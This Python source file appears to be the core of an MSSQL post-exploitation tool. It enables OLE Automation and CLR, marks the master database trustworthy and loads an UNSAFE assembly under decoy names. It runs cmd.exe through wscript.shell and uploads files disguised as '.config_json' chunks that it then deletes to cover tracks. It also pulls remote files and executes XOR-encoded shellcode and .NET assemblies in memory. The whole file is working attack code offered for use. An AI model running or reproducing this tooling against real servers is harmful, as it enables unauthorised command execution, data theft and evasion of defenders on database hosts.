#!/usr/bin/env python
import logging
import os
import sys
import binascii
import time
import ntpath
import base64
import random
import string
from libs.tds import MSSQL


class sql_op:
    def __init__(self, SQL: MSSQL, show_queries=False, at=[], codec="GBK") -> None:
        self.sql = SQL
        self.show_queries = show_queries
        self.at = at
        self.self_clr = False
        self.clr_status = False
        self.ole_status = False
        self.clr_security = False
        self.isdba = False
        self.codec = codec
        self.clr_dll = "bin/Database.dll"
        self.procedure_name = "sp_help_text_tables"
        self.assembly_class_name = "StoredProcedures"
        self.assembly_method_name = "ClrExec"
        self.assembly_prefix = "sys_objects_"
        self.assembly_name = "mssql_log"
        if not self.check_clr():
            print("[!] clr dll not found.")
            sys.exit(-1)
        self.check_config()

    def check_config(self):
        sql = "SELECT is_srvrolemember('sysadmin') AS is_dba"
        row = self.sql_query(sql)
        if row:
            if row[0]['is_dba']:
                self.isdba = True
        sql = "sp_configure"
        row = self.sql_query(sql)
        if row:
            for r in row:
                name = r['name']
                value = r['run_value']
                if name == "clr enabled" and value == 1:
                    self.clr_status = True
                if name == "clr strict security" and value == 0:
                    self.clr_security = True
        
    def check_clr(self):
        if os.path.exists(self.clr_dll):
            clr_data = open(self.clr_dll,'rb').read()
            self.clr_payload = "0x{}".format(binascii.hexlify(clr_data).decode())
            return True
        return False

    def sql_query(self, query):
        try:
            if self.at is not None and len(self.at) > 0:
                for (linked_server, prefix) in self.at[::-1]:
                    query = "EXEC ('" + prefix.replace("'", "''") + query.replace("'", "''") + "') AT " + linked_server
            if self.show_queries:
                print('[%%] %s' % query)
            resp = self.sql.sql_query(query)
            if not self.sql.printReplies():
                return None
            if len(resp) < 100:
                logging.debug("Data from sqlserver: {}".format(resp))
            return resp if resp else True
        except Exception as e:
            print(e)
            return None

    def check_configuration(self, sql, value):
        sql = "SELECT cast(value as INT) as v FROM sys.configurations where name = '{0}';".format(sql)
        row = self.sql_query(sql)
        if row:
            config = row[0]['v']
            if value == config:
                logging.debug("Check config ok!")
                return True
        return False

    def set_configuration(self, sql, value):
        command = "exec master.dbo.sp_configure '{0}', {1}; RECONFIGURE;".format(sql, value)
        resp = self.sql_query(command)
        return resp

    def set_permission(self):
        command = "ALTER DATABASE master SET TRUSTWORTHY ON;"
        logging.info("ALTER DATABASE master SET TRUSTWORTHY ON")
        if self.sql_query(command):
            logging.info("Set permission Done.")
            return True
        return False

    def create_assembly(self):
        assembly_name = self.assembly_prefix + self.assembly_name
        command = '''IF (exists (SELECT * FROM sys.assemblies WHERE name = '{assembly}')) SELECT 1  ELSE CREATE ASSEMBLY [{assembly}] AUTHORIZATION [dbo] FROM {payload} WITH PERMISSION_SET = UNSAFE;'''.format(assembly=assembly_name, payload=self.clr_payload)
        logging.info("Import the assembly")
        if self.sql_query(command):
            logging.info("Assembly execute done.")
            return True
        return False

    def clr_exec(self, command):
        sql = "exec dbo.{} \"{}\"".format(self.procedure_name,command)
        resp = self.sql_query(sql)
        if resp and type(resp) == list:
            print(list(resp[0].values())[0])

    def clr_exec_long(self, cmd, command):
        sql = """
DECLARE @longInput NVARCHAR(MAX) = CAST(N'{}' AS NVARCHAR(MAX));
DECLARE @sql NVARCHAR(MAX) = N'EXEC dbo.{} ''{} ' + @longInput + N''';';
EXEC sp_executesql @sql;
""".format(cmd, self.procedure_name, command)
        self.sql_query(sql)

    def create_procedure(self):
        command = """CREATE PROCEDURE [dbo].[{procedure}] @arg NVARCHAR (MAX) AS EXTERNAL NAME [{assembly}].[{assembly_class}].[{method}]""".format(procedure=self.procedure_name, assembly= self.assembly_prefix + self.assembly_name, assembly_class= self.assembly_class_name,method=self.assembly_method_name)
        logging.info("Link the assembly to a stored procedure")
        if self.sql_query(command):
            logging.info("Create procedure done.")
            return True
        return False

    def install_clr(self):
        try:
            if not self.set_permission():
                logging.error("Set permission error")
                return
            time.sleep(1)
            if not self.create_assembly():
                logging.error("Create assembly error")
                return
            time.sleep(1)
            if not self.create_procedure():
                logging.error("Create procedure error.")
                return
            logging.info("Install clr successful!")
            self.self_clr = True
        except Exception as e:
            logging.error(e)
            return False

    def drop_crl(self):
        assembly_name = self.assembly_prefix + self.assembly_name
        command = "drop PROCEDURE dbo.{}; drop assembly {}".format(self.procedure_name, assembly_name)
        logging.info("Drop PROCEDURE and assembly...")
        if self.sql_query(command):
            logging.info("Execute drop crl command done.")
            self.self_clr = False
            return True
        return False

    # 启用OLE
    def enable_ole(self):
        if not self.ole_status:
            if not self.set_configuration("show advanced options", 1):
                logging.error("Cannot enable 'show advanced options'")
                return False
            if not self.set_configuration("Ole Automation Procedures", 1):
                logging.error("Cannot enable 'Ole Automation Procedures'")
                return False
            logging.info("Enable ole successfully!")
            self.ole_status = True
            return True
        else:
            logging.info("Ole already enabled.")
            return True

    # 关闭OLE
    def disable_ole(self):
        if not self.set_configuration("show advanced options", 1):
            logging.error("Cannot enable 'show advanced options'")
            return False
        if not self.set_configuration("Ole Automation Procedures", 0):
            logging.error("Cannot disable 'Ole Automation Procedures'")
            return False
        if not self.set_configuration("show advanced options", 0):
            logging.error("Cannot disable 'show advanced options'")
            return False
        logging.info("Disable ole successfully!")
        self.ole_status = False

    # 启用CLR
    def enable_clr(self):
        if not self.clr_status:
            if not self.set_configuration("show advanced options", 1):
                logging.error("Cannot enable 'show advanced options'")
                return False
            if not self.set_configuration("clr enabled", 1):
                logging.error("Cannot enable 'crl enable'")
                return False
            logging.info("Enable clr successfully!")
            self.clr_status = True
            return True
        else:
            logging.info("Clr already enabled.")
            return True

    # 关闭CLR
    def disable_clr(self):
        if not self.set_configuration("show advanced options", 1):
            logging.error("Cannot enable 'show advanced options'")
            return False
        if not self.set_configuration("clr enabled", 0):
            logging.error("Cannot disable 'clr enabled'")
            return False
        if not self.set_configuration("show advanced options", 0):
            logging.error("Cannot disable 'show advanced options'")
            return False
        logging.info("Disable clr successfully!")
        self.clr_status = False
        return True

    def data_split(self, data, size):
        data_len = len(data)
        info = [data[i:i + size] for i in range(0, data_len, size)]
        return info

    def file_exists(self, path, value):
        try:
            command = """DECLARE @r INT
    EXEC master.dbo.xp_fileexist '{0}', @r OUTPUT
    SELECT @r as n""".format(path)
            resp = self.sql_query(command)
            if resp[0]['n'] == value:
                return True
        except Exception as e:
            logging.error(e)
        return False

    # sp_shell 命令执行
    def sp_shell(self, command, result=True):
        try:
            if not self.ole_status and self.check_configuration("Ole Automation Procedures", 0):
                if not self.enable_ole():
                    logging.error("Can't use sp shell to execute command.")
                    return
            else:
                self.ole_status = True
            sql = """declare @shell int,@exec int,@text int,@str varchar(8000); 
                exec sp_oacreate 'wscript.shell',@shell output;
                exec sp_oamethod @shell,'exec',@exec output,'c:\windows\system32\cmd.exe /c {0}';
                exec sp_oamethod @exec, 'StdOut', @text out;
                exec sp_oamethod @text, 'ReadAll', @str out;
                exec sp_oadestroy @shell;
                select @str""".format(command)
            row = self.sql_query(sql)
            resp = row[0]['']
            if result:
                print("\n{}\n".format(resp.decode("GBK",errors="ignore")))
            return True
        except Exception as e:
            logging.error(e)
        return False

        
    def hex_save(self, data, path):
        try:
            hex_data = binascii.hexlify(data=data)
            command = '''DECLARE @ObjectToken INT;
EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT;
EXEC sp_OASetProperty @ObjectToken, 'Type', 1;
EXEC sp_OAMethod @ObjectToken, 'Open';
EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{0};
EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL,'{1}', 2;
EXEC sp_OAMethod @ObjectToken, 'Close';
EXEC sp_OADestroy @ObjectToken;'''.format(hex_data.decode(), path)
            resp = self.sql_query(command)
            if resp:
                return True
        except Exception as e:
            logging.error(e)
        return False

    # 删除文件历史
    def file_remove(self, remote):
        try:
            file_path = remote.replace(ntpath.basename(remote),"")
            command = "del /f /q {}*.config_json".format(file_path)
            if self.sp_shell(command, result=False):
                logging.info("Clean up done.")
                return True
            logging.error("Remote file {} error.".format(remote))
        except Exception as e:
            logging.error(e)
        return False


    # 文件上传
    def file_upload(self, local, remote):
        if not self.ole_status and self.check_configuration("Ole Automation Procedures", 0):
            if not self.enable_ole():
                logging.error("Can't use ole upload files..")
                return
        else:
            self.ole_status = True
        logging.info("Uploading '{0}' to '{1}'...".format(local, remote))
        if not os.path.exists(local):
            logging.error("Local file not exists..")
            return
        if self.file_exists(remote, 1):
            logging.error("Remote file already exists.")
            return
        file_data = open(local, "rb").read()
        num = 0
        pre_command = "copy /b "
        data_list = self.data_split(file_data, 250000)
        for data in data_list:
            file_name = "{}_{}.config_json".format(remote, num)
            if not self.hex_save(data, file_name):
                logging.error("Upload file failed..")
                return
            pre_command += "\"{}\" +".format(file_name)
            time.sleep(1)
            if self.file_exists(file_name, 1):
                logging.info("File {} upload completed.".format(file_name))
            else:
                logging.error("{} upload failed.".format(file_name))
                return
            time.sleep(1)
            num += 1
        command = pre_command.rstrip("+") + " \"{}\"".format(remote)
        status = self.sp_shell(command, result=False)
        if status:
            logging.info("Copy /b {0}_x.config_json {0}".format(remote))
        else:
            logging.error("Execute command error")
            self.file_remove(remote=remote)
            return
        time.sleep(1)
        if self.file_exists(remote, 1):
            logging.info("Upload completed !")
        self.file_remove(remote=remote)

    # 文件下载
    def file_doanload(self, remote, local):
        if not self.ole_status and self.check_configuration("Ole Automation Procedures", 0):
            if not self.enable_ole():
                logging.error("Can't use ole download files..")
                return
        else:
            self.ole_status = True
        logging.info("Downloading '{0}' to '{1}'...".format(remote, local))
        if not self.file_exists(remote, 1):
            logging.error("Remote file {} not exists.".format(remote))
            return
        if os.path.exists(local):
            logging.error("Already have {}".format(local))
            return
        # SINGLE_BLOB 选项将它们读取为二进制文件
        sql = "SELECT * FROM OPENROWSET(BULK N'{0}', SINGLE_BLOB) rs".format(remote)
        resp = self.sql_query(sql)
        if resp:
            file_data = list(resp[0].values())[0]
            with open(local, "wb") as f:
                f.write(binascii.unhexlify(file_data))
        time.sleep(1)
        if os.path.exists(local):
            logging.info("Download completed.")

    def xor_enc_dec(self, input_data, key_phrase):
        key_bytes = key_phrase.encode("utf-8")
        buffer_bytes = bytearray(len(input_data))
        for i in range(len(input_data)):
            buffer_bytes[i] = input_data[i] ^ key_bytes[i % len(key_bytes)]
        return buffer_bytes
    
    def execute_shellcode(self, cmd, file):
        try:
            if not os.path.exists(file):
                logging.error("File {} not found".format(file))
                return
            file_data = open(file,'rb').read()
            xor_key = ''.join(random.sample(string.ascii_letters + string.digits, 8))
            xor_key_pass = base64.b64encode(xor_key.encode('utf-8')).decode('utf-8')
            file_payload = base64.b64encode(self.xor_enc_dec(file_data, xor_key)).decode('utf-8')
            command = "{} {}".format(file_payload, xor_key_pass)
            self.clr_exec_long(cmd, command)
        except Exception as e:
            logging.error(e)
            return

    # execute-assembly
    def execute_assembly(self, cmd, input, type='file'):
        try:
            if type=='file':
                if not os.path.exists(input):
                    logging.error("File {} not found".format(input))
                    return
                file_data = open(input,'rb').read()
            else:
                file_data = input
            xor_key = ''.join(random.sample(string.ascii_letters + string.digits, 8))
            xor_key_pass = base64.b64encode(xor_key.encode('utf-8')).decode('utf-8')
            file_payload = base64.b64encode(self.xor_enc_dec(file_data, xor_key)).decode('utf-8')
            command = "{} {}".format(file_payload, xor_key_pass)
            self.clr_exec_long(cmd, command)
        except Exception as e:
            logging.error(e)
            return

        




